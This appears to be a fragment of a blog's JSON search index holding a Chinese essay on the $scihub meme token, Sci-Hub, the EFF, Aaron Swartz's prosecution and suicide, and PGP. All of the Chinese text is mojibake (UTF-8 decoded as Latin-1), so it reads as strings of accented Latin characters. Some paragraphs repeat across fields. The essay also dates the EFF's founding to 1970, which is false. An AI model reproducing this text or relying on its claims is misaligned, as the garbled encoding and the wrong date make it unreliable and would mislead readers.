æ­¤å³ä¾¿å—åˆ°äº†FBIçš„è°ƒæŸ¥ï¼ŒAaronä¹Ÿæ²¡æœ‰è¢«æ§å‘Šã€‚â€œå¹¸è¿â€ çš„ä»–ç»§ç»­åœ¨è‹±æ–‡ç»´åŸºç™¾ç§‘ä¸­è¿›è¡Œç€ä»2003å¹´ä»¥æ¥çš„ç¼–è¾‘æ´»åŠ¨ï¼Œåœ¨ç¾å›½æ”¿æ²»æœºæ„ã€æ”¿åºœå®˜å‘˜ç­‰ä¸»é¢˜ä¸Šæ·»åŠ äº†è®¸å¤šæ¡ç›®ã€‚\nç›´åˆ°ä»–è‡ªæ€çš„é‚£ä¸€å¤©ã€‚\n2011å¹´1æœˆ6æ—¥æ™šï¼Œæ–¯æ²ƒèŒ¨åœ¨å“ˆä½›å¤§å­¦æ ¡å›­é™„è¿‘è¢«è­¦å¯Ÿå’Œç‰¹å·¥é€®æ•ï¼Œ ä»–ä»¬å‘ç° Aaron é€šè¿‡MITçš„æ ¡å›­ç½‘ä¸‹è½½äº†å¤§é‡çš„æœŸåˆŠæ–‡ç« ï¼Œå› æ­¤ä»¥éæ³•ä»å—ä¿æŠ¤çš„è®¡ç®—æœºä¸­è·å–ä¿¡æ¯çš„ç½ªåæ£€æ§ Aaronã€‚ è€Œåœ¨è”é‚¦æ£€å¯Ÿå®˜çš„ä»‹å…¥ä¸‹ï¼ŒAaron æ–°å¢äº†ä¹é¡¹é‡ç½ªï¼Œé¢ä¸´æœ€é«˜50å¹´çš„ç›‘ç¦å’Œ100ä¸‡ç½šæ¬¾! åœ¨å‹åŠ›ä¸‹ï¼ŒAaroné€‰æ‹©äº†ä¸ŠåŠã€‚\nAaronçš„æ­»äº¡æ— ç–‘ä»£è¡¨äº†å½“æ—¶ç¾å›½å¸æ³•ç³»ç»Ÿä¸­çš„è¿‡åˆ†æ£€æ§å’Œæå“ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œä»–æˆä¸ºäº†ä¸€ä¸ªç¬¦å·ï¼Œä¸€ä¸ªæ®‰é“è€…ï¼Œä»–çš„æ­»äº¡æ¿€èµ·äº†å…¨ç¤¾ä¼šå„ç•Œçš„å¹¿æ³›å…³æ³¨ã€‚äººä»¬åœ¨ç™½å®«ç½‘ç«™ä¸Šè¦æ±‚ç½¢å…ä¸ºAaronæ–°å¢ç½ªåçš„æ£€å¯Ÿå®˜ï¼Œè‰ºæœ¯ç•Œç”¨å„ç§æ¶‚é¸¦å’Œå£ç”»çºªå¿µä»–ï¼Œé»‘å®¢ä»¬æ”»å…¥äº†MITå’Œæ”¿åºœçš„ç½‘ç«™ï¼Œå°†é¡µé¢æ›¿æ¢ä¸ºäº†å¯¹Aaronçš„çºªå¿µå’Œå“€æ‚¼ã€‚\nAaronçš„æ­»æ‰€å¸¦æ¥çš„æœ€æ·±è¿œå½±å“ï¼Œä¾¿æ˜¯åˆºæ¿€äº†è¶Šæ¥è¶Šå¤šçš„äººå’Œç»„ç»‡å‚ä¸åˆ°äº†å¼€æ”¾è·å–å’ŒçŸ¥è¯†å¹³æƒä¸­çš„è¿åŠ¨ä¸Šæ¥ï¼Œä»¥è‡³äºJournal of Library Administration çš„ä¸€ä½ç¼–å§”ä¼šæˆå‘˜å†™é“ï¼Œåœ¨Aaronæ­»åï¼Œâ€œåœ¨éå¼€æ”¾è·å–åˆŠç‰©ä¸Šå‘è¡¨è¦å—åˆ°è‰¯çŸ¥çš„è°´è´£â€ã€‚å¯ä»¥è¯´Scihubå°±æ˜¯è¿™è‚¡è¿åŠ¨çš„ç»§æ‰¿è€…ã€‚\nä¸å…¶ä»–é¼“å¹scihubçš„è¨€è®ºç›¸æ¯”ï¼Œæˆ‘å¹¶ä¸æ˜¯å¾ˆçœ‹é‡å®ƒåœ¨å…è´¹è·å–è®ºæ–‡ä¸Šçš„æ•ˆæœï¼Œå°±ä¸ªäººçš„æœ‰é™ä½“éªŒè€Œè¨€ï¼Œæˆ‘æŸ¥è¯¢çš„æ–‡çŒ®ä¸­ä¾æ—§æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯scihubæ²¡æœ‰æ”¶å½•çš„ï¼Œè€Œç ”ç©¶ç”ŸæœŸé—´ï¼Œé€šè¿‡å­¦æ ¡çš„æ ¡å›­ç½‘å°±å¯ä»¥ä¸‹è½½åˆ°é‚£äº›éœ€è¦ä»˜è´¹è®¢é˜…çš„è®ºæ–‡ï¼Œä¹Ÿæ²¡æœ‰ä½¿ç”¨scihubçš„åˆšéœ€ï¼Œä¸è¿‡å®ƒçš„å­˜åœ¨å’Œå‘å±•ä¾æ—§æ˜¯å€¼å¾—è¢«è®¤å¯å’Œæ”¯æŒçš„ï¼Œä¸ä»…ä»…æ˜¯ä¸ºäº†å®ƒä¸ºäº†é‚£äº›æ²¡æœ‰æ¡ä»¶çš„ç§‘ç ”äººå‘˜åšå‡ºçš„è™½ç„¶æœ‰é™ä½†åˆ‡å®å­˜åœ¨çš„å¹³æƒåŠªåŠ›ï¼Œæ›´æ˜¯ä¸ºäº†é‚£ä»½ä¼ æ‰¿äº†ä¸‰åä½™å¹´çš„ç²¾ç¥å›¾è…¾ï¼Œå®ƒè®©äººä»¬åœ¨é™ˆè…çš„å•†ä¸šä¸–ç•Œä¸­ï¼Œä¾æ—§èƒ½å¤Ÿçœ‹åˆ°ç†æƒ³ä¸»ä¹‰å’Œæ—©æœŸäº’è”ç½‘è‡ªç”±ç²¾ç¥çš„ä½™è¾‰ã€‚\nå½“ç„¶ï¼ŒAlexandra ä¾æ—§é¢ä¸´ç€ä¸¥å³»çš„çŸ¥è¯†å°é”å’Œæ³•å¾‹é£é™©ï¼Œä»¥åŠæ›´ç°å®çš„ç»æµé—®é¢˜ã€‚å°½ç®¡æœ‰ä¸å°‘å¿—æ„¿è€…è¯•å›¾ä¼ æ’­å’Œå¸®åŠ©Scihubï¼Œä½†èŒƒå›´æœ‰é™ï¼Œæ•ˆæœç”šå¾®ï¼Œ éƒ¨åˆ†åŸå› åœ¨äºï¼Œäº’è”ç½‘çš„æ–°ç”Ÿä¸€ä»£æ­£é€æ¸æŒæ¡è¯è¯­æƒï¼Œè€Œä»–ä»¬ç”Ÿæ´»åœ¨ä¸€ä¸ªè¢«å‰è¾ˆ\u0026quot;ä¿®æ­£\u0026quot;è¿‡äº†çš„ç½‘ç»œä¸–ç•Œï¼Œ æ²¡æœ‰ç»å†è¿‡çŸ›ç›¾çš„å†²çªå’Œå†å²æ€§çš„è¿åŠ¨ï¼Œç¼ºä¹å¯¹ç½‘ç»œè‡ªç”±æ„å¿—ä¸»ä¹‰çš„è®¤çŸ¥å’Œä½“ä¼šï¼Œæœ€å¤šä¾¿æ˜¯ç§°é“ä¸€å£°Respectã€‚ å¥½æ¯”åªæœ‰å½“ä½ æ˜¯ä¸Šä¸–çºªä¸‰å››åå¹´ä»£çš„ä¸­å›½å†œæ°‘æ—¶ï¼Œæ‰èƒ½çœŸæ­£ä½“ä¼šåˆ°ä»Šå¤©æ”¿æ²»ä¹¦é‡Œçš„é™ˆè¯æ»¥è°ƒåœ¨å½“å¹´ç¡®å®æ˜¯æ•‘å›½å›¾å­˜çš„å­˜åœ¨ã€‚\nç¤¾ä¼šçš„å¥å¿˜ä¸ä»…ä¸ºçŸ¥è¯†å¹³æƒå¸¦æ¥äº†å›°éš¾ï¼Œä¹Ÿè®©å…¶ä»–æ›¾ç»è¢«\u0026quot;ä¿®å¤\u0026quot;è¿‡çš„é‚£äº›é—®é¢˜é‡æ–°æµ®ç°ï¼Œç”šè‡³å˜å¾—æ›´åŠ é«˜æ˜å’Œæ£˜æ‰‹ï¼Œå› ä¸ºæ”¿åºœå’Œå•†ä¸šå…¬å¸å·²ç»å­¦ä¼šæ¸©æ°´ç…®é’è›™çš„æ¨¡å¼æ…¢æ…¢ä¾µçŠ¯ç”¨æˆ·ï¼Œè€Œæ—¶é—´å’Œå¥å¿˜æ˜¯ä»–ä»¬çš„ç›Ÿå‹ã€‚è¯•é—®æœ‰è°è®°å¾—è°·æ­Œæ›¾ç»åœ¨è‡ªå·±çš„è¡Œä¸ºå‡†åˆ™å¼€å¤´ä¸­æ‰¿è¯ºè¿‡\u0026quot;Don\u0026rsquo;t be evil\u0026quot;å‘¢? å¤§éƒ¨åˆ†çš„äººä»…ä»…å…³å¿ƒè‡ªå·±çš„éœ€æ±‚èƒ½ä¸èƒ½æ»¡è¶³ï¼Œè‡³äºé‚£\u0026quot;å°å°\u0026quot;çš„éšç§ä¾µçŠ¯? æˆ–è®¸è®©äººä¸å¿«ï¼Œä½†é‚£åˆå¦‚ä½•?\nå¯ä»¥è¯´ï¼Œäº’è”ç½‘çš„å†å²ï¼Œå°±æ˜¯äººä»¬ç”¨éšç§å’Œè‡ªç”±æ¢å–ä¾¿åˆ©çš„å†å²ï¼Œå³ä¾¿è¿™ç§äº¤æ˜“æœ‰æ—¶å€™å¹¶ä¸ç­‰ä»·ã€‚\nå›åˆ°web3ï¼Œè¿™æ˜¯ä¸€ä¸ªé»‘æš—æ£®æ—ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå……æ»¡äº†æœºä¼šçš„åœ°æ–¹ã€‚é™¤äº†ä¸ºScihubçš„æ¨å¹¿å¸¦æ¥äº†ä¾¿åˆ©ä¹‹å¤–ï¼Œå»ä¸­å¿ƒåŒ–æŠ€æœ¯çš„æœ¬è´¨æ ¸å¿ƒï¼Œä¹Ÿå°±æ˜¯åŠ å¯†æŠ€æœ¯ï¼ŒåŒæ ·æ˜¯å½“å¹´ç½‘ç»œè‡ªç”±æ„å¿—ä¸»ä¹‰çš„äº§ç‰©ï¼Œå…¶èƒŒåçš„ä¸€äº›æ•…äº‹ä¹ŸåŒæ ·é¢‡å…·ä¼ å¥‡è‰²å½©ã€‚\n1991å¹´ï¼Œè²å°”Â·é½é»˜æ›¼ä¸ºäº†è®©æ‰€æœ‰äººå¯ä»¥å®‰å…¨è®¿é—®BBSå’Œå­˜å‚¨ä¿¡æ¯ï¼Œå¼€å‘äº†ç”¨äºé€šè®¯åŠ å¯†çš„åº”ç”¨ç¨‹åºPGP(Pretty Good Privacy)å¹¶å‘å¸ƒåœ¨äº’è”ç½‘ä¸Šä¾›äººå…è´¹ä½¿ç”¨ã€‚è€Œåœ¨å½“æ—¶çš„ç¾å›½ï¼Œä½¿ç”¨å¤§äº40ä½å¯†é’¥çš„åŠ å¯†ç³»ç»Ÿè¢«è§†ä¸ºå†›éœ€å“ã€‚PGPçš„å¯†é’¥é•¿åº¦è¿œè¿œè¶…å‡ºäº†è¿™ä¸€é™åˆ¶ï¼Œå› æ­¤æ”¿åºœä»¥\u0026quot;æ²¡æœ‰æˆæƒçš„å†›éœ€å“å‡ºå£\u0026quot;ä¸ºåå¯¹ä»–å‘èµ·è°ƒæŸ¥ï¼Œä½†é½é»˜æ›¼ä½¿ç”¨äº†ä¸€ä¸ªå¤©æ‰èˆ¬çš„æƒ³æ³•å»å¯¹æŠ—è§„å®š: ä»–å°†PGPçš„æºä»£ç å‡ºç‰ˆä¸ºä¸€æœ¬ä¹¦ã€‚\nä¸å†›éœ€å“å‡ºå£ä¸åŒï¼Œä¹¦æœ¬å‡ºå£å’Œä¼ æ’­ç¬¦åˆç¾å›½å®ªæ³•ç¬¬ä¸€ä¿®æ­£æ¡ˆä¸­çš„è¨€è®ºè‡ªç”±éƒ¨åˆ†ï¼Œå› è€Œå—åˆ°ä¿æŠ¤ï¼Œæ³•é™¢å› æ­¤åˆ¤å®šé½é»˜æ›¼æ— ç½ªã€‚è¿™ä¸ªæ¡ˆä»¶æ·±åˆ»å½±å“äº†åæ¥ç±»ä¼¼æ¡ˆä»¶çš„å¸æ³•è£å®šï¼Œè€ŒPGPä¾æ—§ç»§ç»­å‘æŒ¥ç€éšç§ä¿æŠ¤çš„å¼ºå¤§ä½œç”¨ï¼Œå®ƒçš„åè¾ˆGPG (GnuPG) å¸®åŠ© Edward Joseph Snowden åœ¨é€ƒäº¡æœŸé—´è”ç³»æ–°é—»ç•Œï¼Œä¸€ä¸¾æ­å‘äº†2013å¹´å¼•çˆ†å…¨çƒçš„ç¾å›½æ£±é•œè®¡åˆ’ã€‚\nç°å¦‚ä»Šï¼ŒåŠ å¯†æŠ€æœ¯æœ€å¹¿ä¸ºäººçŸ¥çš„åº”ç”¨ä¹‹ä¸€: åŠ å¯†è´§å¸ï¼Œå½“åˆä¹Ÿæ˜¯å¯†ç å­¦æå®¢å½“åˆç”¨æ¥æŠµå¾¡æ”¿åºœçš„å·¥å…·ï¼Œä»Šå¤©çš„å®ƒæ­£åœ¨å€ŸåŠ©å…¶ç—…æ¯’å¼çš„ä¼ æ’­æ€§å’Œå¸å¼•åŠ›ï¼Œè®©è¶Šæ¥è¶Šå¤šçš„äººå…³æ³¨åˆ°äº†Scihubè¿™æ ·ä¸€ä¸ªé•¿æœŸè¿è¥ä½†å§‹ç»ˆç£•ç£•ç»Šç»Šçš„é¡¹ç›®ä¸­æ¥ï¼Œè€ƒè™‘åˆ°å®ƒä»¬éƒ½å¯ä»¥è¿½æº¯åˆ°äº”åå¹´å‰çš„æ–‡åŒ–å’Œç½‘ç»œè‡ªç”±æ„å¿—ï¼Œå³ä¾¿æˆ–è®¸ç›¸å½“ä¸çº¯ç²¹ï¼Œè¿™æ ·çš„è”åˆè¿˜æ˜¯é¢‡æœ‰ç§åˆ†å®¶å¤šå¹´çš„å…„å¼Ÿå§å¦¹äº’å¸®äº’åŠ©çš„æ„Ÿè§‰ã€‚\nçš„ç¡®ï¼Œä¸€ä¸ªæ™®éçš„å¸¸è¯†æ˜¯ï¼Œå¸åœˆé‡Œæ²¡æœ‰ä»€ä¹ˆçº¯ç²¹çš„å¥½äººï¼Œå¤§éƒ¨åˆ†è´­å…¥$scihubä»¥åŠå…¶ä»–DeScié¡¹ç›®çš„äººéƒ½æ˜¯æŠ•æœºå®¢ï¼Œåœ¨ä¸°å¯Œçš„æŠ•èµ„ç»éªŒä¸‹ï¼Œä¼—å¤šmemeçš„ç©ºæ´è€Œåƒç¯‡ä¸€å¾‹çš„å™äº‹å·²ç»æ— æ³•æ»¡è¶³è¿™å¸®æŒ‘å‰”çš„è€ç‹ç‹¸äº†ï¼Œé€‰æ‹© $scihub å’Œå…¶ä»– DeSciï¼Œåªæ˜¯é€‰æ‹©äº†ä¸€ä¸ªç›¸å¯¹å¯é è€Œåšå®å¹¶ä¸”æœ‰é å±±çš„å™äº‹ï¼Œä¸€å¤„å€Ÿç€ç†æƒ³ä¸»ä¹‰å‘æ³„æŠ•æœºæ¬²æœ›çš„æ¸ é“ã€‚è‡³äºçŸ¥è¯†å¹³æƒå’Œå¼€æ”¾è·å–ï¼Œè™½ç„¶è¶³å¤Ÿç†æƒ³ä¹Ÿè¶³å¤ŸåŠ¨äººï¼Œä½†ç”±äºä¸Šè¿°çš„åŸå› ï¼Œç»ˆç©¶è¿˜æ˜¯åªèƒ½è¢«å°‘æ•°äººçœŸæ­£é¢†ä¼šè€Œä¸ä»…ä»…åªæ˜¯æ²¦ä¸ºå£å·ã€‚\nå¯å³ä¾¿å¦‚æ­¤ï¼Œæˆ‘è¿˜æ˜¯å¯¹è¿™åœº\u0026quot;åˆä½œ\u0026quot;çš„ç»“æœæŠ±æœ‰å…´è¶£ï¼Œæˆ‘æƒ³çŸ¥é“ï¼Œå½“ç†æƒ³ä¸»ä¹‰è€…é‡ä¸Šé‚£äº›æŠ±ç€ç‹‚èºçš„æ¬²æœ›å’Œæ‰‹ä¸­çš„çƒ­é’±çš„æå®¢ã€æŠ•æœºçŠ¯ã€éª—å­ã€è‡ªå¤§ç‹‚å’Œç‹‚ä¿¡å¾’æ—¶ï¼Œå½“ç›²ç›®çš„èµ„æœ¬é‡ä¸Šçº¯ç²¹çš„å…¬æ°‘è¿åŠ¨æ—¶ï¼Œå®ƒä»¬æ˜¯ä¼šåœ¨ä¸ç‰ºç‰²ä»»ä½•ä¸€æ–¹åŸå§‹ç«‹åœºçš„æƒ…å†µä¸‹ä»¥ä¸€ç§é»˜å¥‘çš„å¹³è¡¡å…³ç³»ä¿æŒè¾¹ç•Œå¹¶æŒç»­åä½œï¼Œè¿˜æ˜¯ç›¸äº’ç«äº‰ç›´åˆ°ä¸€æ–¹è¢«åå™¬è€Œæ²¦è½ä¸ºå¦ä¸€æ–¹æ‰€åˆ©ç”¨çš„å·¥å…·? å¦‚æœå‰è€…èƒ½å¤Ÿæˆç«‹ï¼Œé‚£ä¹ˆå…¶å¸¦æ¥çš„ç§¯ææ„ä¹‰æ˜¯å¦é€‚ç”¨äºå…¶ä»–é¢†åŸŸ? è€Œè‡³äºåè€…ï¼Œæˆ‘çœŸçœŸåˆ‡åˆ‡çš„ä¸å¸Œæœ›å‘ç”Ÿï¼Œå› ä¸ºåœ¨é‚£ç§æƒ…å†µä¸‹ï¼Œå—ä¼¤å®³çš„ä¸€æ–¹å¿…å°†æœ‰ä¸”åªæœ‰Scihubã€‚\n","permalink":"https://dragonbox.top/posts/gossip-scihub/","summary":"\u003cp\u003e2024å¹´11æœˆ16æ—¥åˆ°20å·ï¼Œä¸å¤ªå¹³é™çš„MEMEåœˆä¸­å‘ç”Ÿäº†ä¸€ä»¶æœ‰è¶£çš„äº‹æƒ…ã€‚ç®€å•æ¥è¯´ï¼Œä¸€ä¸ªåŒ—å¤§å‡ºèº«çš„å¤§V(0xAA_Science)å‘ç°äº†ä¸€ä¸ªå·²ç»è¢«åŸå§‹å¼€å‘è€…è„±æ‰‹çš„meme: scihubï¼Œå¹¶æ„è¯†åˆ°äº†è¿™æ˜¯ä¸€ä¸ªå¥½æœºä¼šï¼Œæˆ–è®¸æ˜¯å¸®åŠ©DeSci(å»ä¸­å¿ƒåŒ–å­¦æœ¯)çš„å¥½æœºä¼šï¼Œäº¦æˆ–æ˜¯èµšé’±çš„å¥½æœºä¼šï¼Œå½“ç„¶ï¼Œæ›´æœ‰å¯èƒ½çš„æ˜¯äºŒè€…å…¼æœ‰ï¼Œæ€»ä¹‹ï¼Œä»–è´­å…¥äº†20%çš„scihubä»£å¸ï¼Œå¹¶è”ç³»Scihubçš„åˆ›å§‹äºº Alexandra Elbakyan è®¡åˆ’åˆ†æ‰¹æ¬¡å°†ä»£å¸æèµ ã€‚\u003c/p\u003e\n\u003cp\u003eä¸€å¼€å§‹ï¼ŒAlexandra çš„æ€åº¦æ˜¯åˆç†çš„è´¨ç–‘ï¼Œä¸€æ–¹é¢ï¼Œåˆ†æ‰¹æ¬¡çš„æåŠ©å¾ˆéš¾ä¸è®©äººèµ·ç–‘å¿ƒ; å¦ä¸€æ–¹é¢ï¼Œå¯¹äºä¸æ€ä¹ˆå…³æ³¨å¸åœˆçš„å¥¹æ¥è¯´ï¼Œå°†ä»£å¸å† ä»¥scihubçš„åå­—åœ¨å¸‚åœºä¸Šæµé€šï¼Œå¾ˆéš¾ä¸è®©äººè§‰å¾—è¿™æ˜¯ä¸€ç§äºµæ¸ï¼Œå°¤å…¶æ˜¯ä»¥çŸ¥è¯†å¹³æƒä¸ºç›®æ ‡çš„scihubã€‚\u003c/p\u003e\n\u003cp\u003eè€Œå¯¹äºå¸¸å¹´æ··è¿¹web3çš„æŠ•èµ„å®¢ä»¬ï¼Œè¿™ç§è¡Œä¸ºä¹Ÿæ— å¼‚äºå·§å¦™çš„è¥é”€: DeSciçš„ç†å¿µå’ŒèƒŒé çš„æ‰å®é¡¹ç›®ï¼Œè®©$scihubçš„å™äº‹æˆä¸ºäº†ä¹±ä¸ƒå…«ç³Ÿçš„memeä¼—ç”Ÿä¸­çš„ä¸€è‚¡æ¸…æµï¼Œè€Œä¸”é€šè¿‡æåŠ©è¡Œä¸ºï¼Œè®©è¿™ä¸ªåŸæœ¬æ— äººé—®æ´¥çš„ä»£å¸ä¸scihubçš„è”ç³»ä»ä»…ä»…åŒåä¸Šå‡åˆ°äº†åˆ©ç›Šç›¸å…³ã€‚åœ¨ä»Šå¤©çš„ä»£å¸æµ·æ´‹ï¼Œå“ªæ€•å¤šå‡ ä¸ªäººå–Šå–Šå£å·ç‚’ä½œç‚’ä½œæ•…äº‹å’Œæ¦‚å¿µéƒ½å¯ä»¥è®©ä»£å¸ä¸€é£å†²å¤©ï¼Œæ›´åˆ«æå¦‚æœèƒŒé æ‰å®è€Œå…·ä½“å¹¶ä¸”è¿è¥å¤šå¹´çš„é¡¹ç›®äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå¥½äº†ï¼Œå…³äºå¸åœˆçš„å†…å®¹å…ˆæš‚åœï¼Œç°åœ¨è°ˆè°ˆæ‰€è°“çš„DeSciæ¦‚å¿µçš„æºå¤´: ç½‘ç»œè‡ªç”±æ„å¿—ä¸»ä¹‰ã€‚\u003c/p\u003e\n\u003cp\u003eä¸å…¶ä»–å¹³æƒè¿åŠ¨ç›¸åŒï¼ŒçŸ¥è¯†å¹³æƒä¹Ÿèµ·æºäºè‡ªç”±æ„å¿—ä¸»ä¹‰ï¼Œåœ¨äº’è”ç½‘é»‘å®¢ä¸­ï¼Œè¿™ä½“ç°ä¸ºç½‘ç»œè‡ªç”±æ„å¿—ä¸»ä¹‰ï¼Œå…¶é‡ç‚¹åœ¨äºï¼Œå‡å°‘æ”¿åºœç®¡åˆ¶å®¡æŸ¥æˆ–å…¶ä»–å¹²æ¶‰äº’è”ç½‘\u0026quot;è‡ªç”±\u0026quot;çš„è¡Œä¸ºã€‚åœ¨å½“æ—¶ï¼Œæ–°å…´çš„äº’è”ç½‘é€šè®¯æŠ€æœ¯ä»¤æ”¿åºœå¤„äºè®¤çŸ¥æ··ä¹±çš„çŠ¶æ€ï¼Œåœ¨æ‰§æ³•è¿‡ç¨‹ä¸­å‡ºç°äº†ä¸å°‘ä¾µçŠ¯ä¸ªäººè‡ªç”±çš„æ¡ˆä¾‹ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨æ­¤èƒŒæ™¯ä¸‹ï¼Œçº¦ç¿°Â·å‰å°”æ‘©ç­‰äººäº1970å¹´æˆç«‹äº†ç”µå­å‰çº¿åŸºé‡‘ä¼š (Electronic Frontier Foundation)ï¼Œå…¶ä¸»è¦ä½¿å‘½æ˜¯:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eå¸®åŠ©å…¬ä¼—äº†è§£æ›´å¤šæœ‰å…³è®¡ç®—æœºå’Œé€šä¿¡é¢†åŸŸå‘å±•å¸¦æ¥çš„æœºé‡ä¸æŒ‘æˆ˜\u003c/li\u003e\n\u003cli\u003eä¿ƒä½¿æ”¿ç­–åˆ¶å®šè€…å¯¹é‚£äº›æ„æˆé€šä¿¡çš„è‡ªç”±å’Œå¼€æ”¾çš„åŸºæœ¬é—®é¢˜æœ‰æ›´å¥½çš„äº†è§£\u003c/li\u003e\n\u003cli\u003eæé«˜å…¬ä¼—å¯¹éšæ–°è®¡ç®—æœºé€šä¿¡åª’ä»‹è¿…é€Ÿå‘å±•è€Œäº§ç”Ÿçš„å…¬æ°‘è‡ªç”±é—®é¢˜çš„è®¤è¯†\u003c/li\u003e\n\u003cli\u003eä¸ºé‚£äº›å—åˆ°æ¯«æ— æ ¹æ®æˆ–è¯¯å¯¼çš„æ³•å¾‹å¨èƒçš„æ–°æŠ€æœ¯å’Œä¸ªäººè¿›è¡Œè¾©æŠ¤\u003c/li\u003e\n\u003cli\u003eé¼“åŠ±å’Œæ”¯æŒæ–°æŠ€æœ¯çš„å¼€å‘ï¼Œå¸®åŠ©éæŠ€æœ¯ç”¨æˆ·å¯ä¸å—ä»»ä½•å½±å“ä¸”æ–¹ä¾¿åœ°æ¥è§¦åˆ°æ–°é€šä¿¡æŠ€æœ¯\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eç”µå­å‰çº¿åŸºé‡‘ä¼šä¸ºæ¨è¿›å½“æ—¶çš„äº’è”ç½‘è‡ªç”±å‘æŒ¥è¿‡ä¸å°‘ä½œç”¨ï¼Œä½†æ›´é‡è¦çš„æ˜¯ï¼Œå®ƒä¸ºå½“æ—¶ä¸ºæ•°ä¸å¤šä½†åœ¨æ—¥åå…·å¤‡æ›´å¤šäº’è”ç½‘è¯è¯­æƒçš„æŠ€æœ¯æå®¢ä»¬æˆ–å¤šæˆ–å°‘åœ°ä¼ é€’äº†è‡ªå·±çš„ç†å¿µï¼Œ è¿™å…¶ä¸­å°±åŒ…æ‹¬Redditçš„è”åˆåˆ›å§‹äººï¼ŒåŒæ—¶ä¹Ÿæ˜¯RSSæ ¼å¼å’ŒMarkdownæ ¼å¼çš„å¼€å‘è€…ï¼Œâ€œäº’è”ç½‘ä¹‹å­â€ Aaron Hillel Swartzã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./aaron.jpg\" alt=\"Aaron\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eå—EFFçš„å½±å“ï¼ŒAaronåœ¨å¹´å°‘çš„æ—¶å€™å°±ç§¯æå‚ä¸ç½‘ç»œè‡ªç”±ç›¸å…³çš„äº‹ä¸šï¼š14å²å‚ä¸å¼€å‘RSS1.0ç‰ˆæœ¬ï¼Œå¸®åŠ©åˆ›åŠäº†å…ˆè¿›ç¤¾ä¼šå˜é©æ´»åŠ¨å§”å‘˜ä¼šï¼ŒæˆåŠŸåˆ¶æ­¢ã€Šç¦æ­¢ç½‘ç»œç›—ç‰ˆæ³•æ¡ˆã€‹çš„é¢å¸ƒç­‰ç­‰ã€‚\u003c/p\u003e\n\u003cp\u003e2008å¹´æ—¶ï¼ŒAaron åšå‡ºäº†ä¸€ä¸ªè½°åŠ¨ä¸€æ—¶çš„ä¸¾åŠ¨ï¼šä»æ”¿åºœçš„æ”¶è´¹æ•°æ®åº“ç³»ç»Ÿä¸­ä¸‹è½½äº†å¤§çº¦270ä¸‡ä»½è”é‚¦æ³•é™¢çš„æ–‡ä»¶å¹¶è®©ç½‘ç»œå¤§ä¼—å…è´¹è®¿é—®ã€‚ä¸è¿‡æŒ‰ç…§æ³•å¾‹ï¼Œæ”¿åºœæ–‡ä»¶ä¸å—ç‰ˆæƒæ³•ä¿æŠ¤ï¼Œè¿™äº›æ–‡ä»¶åŸæœ¬å°±æ˜¯åº”è¯¥å…¬å¼€çš„ï¼Œå› æ­¤å³ä¾¿å—åˆ°äº†FBIçš„è°ƒæŸ¥ï¼ŒAaronä¹Ÿæ²¡æœ‰è¢«æ§å‘Šã€‚â€œå¹¸è¿â€ çš„ä»–ç»§ç»­åœ¨è‹±æ–‡ç»´åŸºç™¾ç§‘ä¸­è¿›è¡Œç€ä»2003å¹´ä»¥æ¥çš„ç¼–è¾‘æ´»åŠ¨ï¼Œåœ¨ç¾å›½æ”¿æ²»æœºæ„ã€æ”¿åºœå®˜å‘˜ç­‰ä¸»é¢˜ä¸Šæ·»åŠ äº†è®¸å¤šæ¡ç›®ã€‚\u003c/p\u003e\n\u003cp\u003eç›´åˆ°ä»–è‡ªæ€çš„é‚£ä¸€å¤©ã€‚\u003c/p\u003e\n\u003cp\u003e2011å¹´1æœˆ6æ—¥æ™šï¼Œæ–¯æ²ƒèŒ¨åœ¨å“ˆä½›å¤§å­¦æ ¡å›­é™„è¿‘è¢«è­¦å¯Ÿå’Œç‰¹å·¥é€®æ•ï¼Œ ä»–ä»¬å‘ç° Aaron é€šè¿‡MITçš„æ ¡å›­ç½‘ä¸‹è½½äº†å¤§é‡çš„æœŸåˆŠæ–‡ç« ï¼Œå› æ­¤ä»¥éæ³•ä»å—ä¿æŠ¤çš„è®¡ç®—æœºä¸­è·å–ä¿¡æ¯çš„ç½ªåæ£€æ§ Aaronã€‚ è€Œåœ¨è”é‚¦æ£€å¯Ÿå®˜çš„ä»‹å…¥ä¸‹ï¼ŒAaron æ–°å¢äº†ä¹é¡¹é‡ç½ªï¼Œé¢ä¸´æœ€é«˜50å¹´çš„ç›‘ç¦å’Œ100ä¸‡ç½šæ¬¾! åœ¨å‹åŠ›ä¸‹ï¼ŒAaroné€‰æ‹©äº†ä¸ŠåŠã€‚\u003c/p\u003e\n\u003cp\u003eAaronçš„æ­»äº¡æ— ç–‘ä»£è¡¨äº†å½“æ—¶ç¾å›½å¸æ³•ç³»ç»Ÿä¸­çš„è¿‡åˆ†æ£€æ§å’Œæå“ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œä»–æˆä¸ºäº†ä¸€ä¸ªç¬¦å·ï¼Œä¸€ä¸ªæ®‰é“è€…ï¼Œä»–çš„æ­»äº¡æ¿€èµ·äº†å…¨ç¤¾ä¼šå„ç•Œçš„å¹¿æ³›å…³æ³¨ã€‚äººä»¬åœ¨ç™½å®«ç½‘ç«™ä¸Šè¦æ±‚ç½¢å…ä¸ºAaronæ–°å¢ç½ªåçš„æ£€å¯Ÿå®˜ï¼Œè‰ºæœ¯ç•Œç”¨å„ç§æ¶‚é¸¦å’Œå£ç”»çºªå¿µä»–ï¼Œé»‘å®¢ä»¬æ”»å…¥äº†MITå’Œæ”¿åºœçš„ç½‘ç«™ï¼Œå°†é¡µé¢æ›¿æ¢ä¸ºäº†å¯¹Aaronçš„çºªå¿µå’Œå“€æ‚¼ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"./art.jpg\" alt=\"çºªå¿µ\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eAaronçš„æ­»æ‰€å¸¦æ¥çš„æœ€æ·±è¿œå½±å“ï¼Œä¾¿æ˜¯åˆºæ¿€äº†è¶Šæ¥è¶Šå¤šçš„äººå’Œç»„ç»‡å‚ä¸åˆ°äº†å¼€æ”¾è·å–å’ŒçŸ¥è¯†å¹³æƒä¸­çš„è¿åŠ¨ä¸Šæ¥ï¼Œä»¥è‡³äºJournal of 